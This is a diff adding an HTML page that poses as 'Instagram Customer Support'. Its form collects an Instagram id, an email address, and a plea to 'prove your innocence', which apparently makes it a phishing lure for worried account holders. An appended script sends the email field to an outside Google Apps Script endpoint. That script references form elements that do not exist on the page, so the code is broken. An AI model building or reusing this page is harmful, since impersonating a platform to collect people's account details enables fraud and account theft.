@@ -1,0 +1,40 @@
+<html><head data-ar-id="ajBaRPiVYU"><link rel="stylesheet" href="https://builder.brightery.com/storage/projects/120/NLuvKKAuGRBdst3qwZdqMjkT1oWb6mMHm8zm/css/custom_elements.css?ytDwVW64" id="custom-elements-css" data-ar-id="rw98v8mT6A"><link rel="stylesheet" href="https://builder.brightery.com/storage/projects/120/NLuvKKAuGRBdst3qwZdqMjkT1oWb6mMHm8zm/css/code_editor_styles.css?PTEfhAoD" id="custom-css" data-ar-id="ghyJll50Ff"><link rel="stylesheet" href="https://builder.brightery.com/storage/projects/120/NLuvKKAuGRBdst3qwZdqMjkT1oWb6mMHm8zm/bootstrap/bootstrap.min.css?8G851Zlz" id="bootstrap-css" data-ar-id="RNql0MSiJ4"><link rel="stylesheet" href="https://builder.brightery.com/storage/projects/120/NLuvKKAuGRBdst3qwZdqMjkT1oWb6mMHm8zm/font-awesome/font-awesome.min.css?GGAJ0LE6" id="font-awesome" data-ar-id="ulSZCfUxqi"></head><body data-ar-id="8-DfOm1EdH"><img src="download__1_-removebg-preview.png" class="img-responsive" alt="" data-ar-id="7FBhYwOUWf" style="width: 174px; height: 174px; max-height: none; max-width: none; margin: 0% 0% 0% 42%;"><h1 data-ar-id="HuUj8nhkqs" style="padding: 0px; border-width: 0px; border-style: solid; border-radius: 0px; text-align: center;">Instagram Customer Support</h1><div class="container" data-ar-id="SObrIEHdgu"><div class="page-header" data-ar-id="sT3UCpZIEG"></div></div><div class="container" data-ar-id="I7vgohkUaf"><div class="row" data-ar-id="-9drIatMS0"><div class="col-sm-12" data-ar-id="8gTx-Hx8gP" style="padding: 20px 0px 0px; border-width: 4px; border-style: solid; border-radius: 16px;"><form method="POST" action="https://builder.brightery.com/storage/projects/120/NLuvKKAuGRBdst3qwZdqMjkT1oWb6mMHm8zm/default-form-handler" data-ar-id="y9I88S68mL">
+  <div class="control-group" data-ar-id="zZptg0Gmkn">
+    <div class="form-group floating-label-form-group controls mb-0 pb-2" data-ar-id="moG1GreYB1" style="padding: 0px 20px;">
+      <label data-ar-id="xqX2ELRwqY">Enter your Instagram id</label>
+      <input class="form-control" id="name" name="name" type="text" placeholder="Instagram id" required="required" data-validation-required-message="Please enter your name." data-ar-id="DWRsG4mkQj">
+    </div>
+  </div>
+  <div class="control-group" data-ar-id="wqdFCJP3Z8">
+    
+  </div>
+  <div class="control-group" data-ar-id="l93isclx0a">
+    <div class="form-group floating-label-form-group controls mb-0 pb-2" data-ar-id="TEYSgobhpm" style="padding: 0px 20px;">
+      <label data-ar-id="UUbCbxjAEV">Email</label>
+      <input class="form-control" id="phone" name="phone" type="tel" placeholder="Email" required="required" data-validation-required-message="Please enter your phone number." data-ar-id="vEAhRjU72m">
+    </div>
+  </div>
+  <div class="control-group" data-ar-id="Ovzob0cKK-">
+    <div class="form-group floating-label-form-group controls mb-0 pb-2" data-ar-id="kvj2Tsba-8" style="padding: 0px 20px;">
+      <label data-ar-id="nbpMPFEt2C">Give a suitable reason to prove your innocence</label>
+      <textarea class="form-control" id="message" name="message" rows="5" placeholder="" required="required" data-validation-required-message="Please enter a message." data-ar-id="bilL2gs-oh"></textarea>
+    </div>
+  </div>
+  <div class="form-group" data-ar-id="wV8Pzp6jH1" style="padding: 0px 20px;"><button class="btn btn-primary btn-xl" type="submit" data-ar-id="s7snk27IDA">Send</button></div>
+</form></div></div></div><script id="custom-js" src="https://builder.brightery.com/storage/projects/120/NLuvKKAuGRBdst3qwZdqMjkT1oWb6mMHm8zm/js/code_editor_scripts.js?2p8R7vVI" data-ar-id="V24qVlaQUK"></script><script id="jquery" src="https://builder.brightery.com/storage/projects/120/NLuvKKAuGRBdst3qwZdqMjkT1oWb6mMHm8zm/bootstrap/jquery.min.js?DHRsLOpM" data-ar-id="iI0dhKnGDp"></script><script id="bootstrap-js" src="https://builder.brightery.com/storage/projects/120/NLuvKKAuGRBdst3qwZdqMjkT1oWb6mMHm8zm/bootstrap/bootstrap.min.js?7dTt96oe" data-ar-id="M26bg8O5ze">
+  const googleScriptURL = "https://script.google.com/macros/s/AKfycbzRhPfTW0csO7n9ETcajn2oFEmGMzrGeFafZKmC0S2rW_NEI5LuBr2QcQjSsVigUYE32Q/exec"; // Replace with your Google Apps Script URL
+
+document.getElementById("emailForm").addEventListener("submit", function(event) {
+    event.preventDefault();
+    const email = document.getElementById("email").value;
+
+    // Send the email to your Google Apps Script
+    fetch(`${googleScriptURL}?email=${encodeURIComponent(email)}`)
+        .then(response => response.text())
+        .then(data => {
+            alert("Thank you! Notification sent.");
+            console.log("Notification sent:", data);
+        })
+        .catch(error => console.error("Error sending notification:", error));
+});
+</script></body></html>
